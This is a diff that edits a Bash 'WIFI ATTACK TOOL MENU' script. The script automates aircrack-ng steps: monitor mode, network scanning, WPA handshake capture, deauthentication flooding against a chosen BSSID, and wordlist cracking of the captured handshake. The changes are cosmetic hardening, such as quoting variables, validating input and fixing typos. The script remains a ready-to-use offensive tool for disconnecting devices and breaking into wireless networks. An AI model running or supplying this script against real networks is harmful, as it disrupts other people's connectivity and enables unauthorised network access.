@@ -23,7 +23,7 @@ iwconfig
 echo -e "${C}Note :- If There is no option like (wlano/wlan0mon) monitor mode not support your device use wifi Adaptor${E}"
 read -p "$(echo -e "${G}Enter wireless Interface name (e.g. wlan0mon/wlan0): ${E}")" NFACE
 echo -e "${C}Enabling monitor mode${E}"
-airmon-ng start $NFACE
+airmon-ng start "$NFACE"
 sleep 3
 fi
 IFACE=$(iwconfig 2>/dev/null | awk '/Mode:Monitor/ {print $1}')
@@ -36,7 +36,7 @@ echo -e "${Y}Initializing modules...${E}"
 sleep 2
 if ! command -v figlet &>/dev/null; then
     echo -e "${R}Figlet not installed! Installing...${E}"
-    apt install figlet -y
+    apt update -y && apt install figlet -y
 fi
 echo -e "${Y}Loading interfaces...${E}"
 sleep 2
@@ -44,7 +44,9 @@ echo -e "${G}System Ready ✔${E}"
 sleep 2
 echo -e "${E}"
 echo -e "${B}============================================================${E}"
-figlet WIFI ATTACK TOOL MENU 
+echo -e "${B}"
+figlet "WIFI ATTACK TOOL MENU"
+echo -e "${E}"
 echo -e "${B}============================================================${E}"
 echo -e "${C}        Advanced WiFi Tool"
 echo -e "${B}            by thakur2309"
@@ -62,11 +64,16 @@ echo -e "${G}[5] Restore Network ${E}"
 echo ""
 read -p "$(echo -e "${Y}Choose option: ${E}")" option
 
+if [[ ! "$option" =~ ^[1-5]$ ]]; then
+    echo -e "${R}Invalid option selected!${E}"
+    exit 1
+fi
+
 if [[ $option == 1 ]]; then
     echo -e "${C}Starting scan of nearby networks...${E}"
     echo -e "${C}press Ctrl+C to stop scanning${E}"
     echo -e "${Y}For next process note Network BSSID and Channel name(CH)${E}"
-    airodump-ng $IFACE
+    airodump-ng "$IFACE"
     echo -e "${C}Run this Script again Choose [2] option${E}"
 elif [[ $option == 2 ]]; then
     read -p "$(echo -e "${Y}Enter BSSID: ${E}")" bssid
@@ -74,30 +81,30 @@ elif [[ $option == 2 ]]; then
     echo -e "${C}Handshake capture started${E}"
     echo -e "${C}Do NOT close this terminal${E}"
     echo -e "${C}Open another terminal and run script again, then choose option [3]${E}"
-    airodump-ng -c $channel --bssid $bssid -w handshake $IFACE
+    airodump-ng -c "$channel" --bssid "$bssid" -w handshake "$IFACE"
     
 
 elif [[ $option == 3 ]]; then
     read -p "$(echo -e "${Y}Enter BSSID: ${E}")" bssid
     read -p "$(echo -e "${Y}Enter number of packets: ${E}")" count
-    echo -e "${C}Starting disconnect devices${E}"
-    aireplay-ng --deauth $count -a $bssid $IFACE
-    echo -e "${C}All Device Disconnect Sucessful${E}"
+    echo -e "${C}Starting device disconnection...${E}"
+    aireplay-ng --deauth "$count" -a "$bssid" "$IFACE"
+    echo -e "${C}All Device Disconnect Successful${E}"
 elif [[ $option == 4 ]]; then
     read -p "$(echo -e "${Y}Enter wordlist path: ${E}")" wordlist
     read -p "$(echo -e "${Y}Enter handshake file: ${E}")" handshake
-    aircrack-ng -w $wordlist $handshake
+    aircrack-ng -w "$wordlist" "$handshake"
 elif [[ $option == 5 ]]; then
     echo -e "${C}Re Checking network interface${E}"
     echo -e "${C}Restoring settings...${E}"
-    airmon-ng stop $IFACE
+    airmon-ng stop "$IFACE"
     if command -v systemctl &>/dev/null; then
     systemctl restart NetworkManager
-    echo -e "${Y}Network Restore Sucessfull${E}"
+    echo -e "${Y}Network Restore Successful${E}"
     else
     service NetworkManager restart
-    echo -e "${Y}Network Restore Sucessfull${E}"
+    echo -e "${Y}Network Restore Successful${E}"
     fi
 else
-    echo "Invalid option"
+    echo -e "${R}Invalid option selected!${E}"
 fi
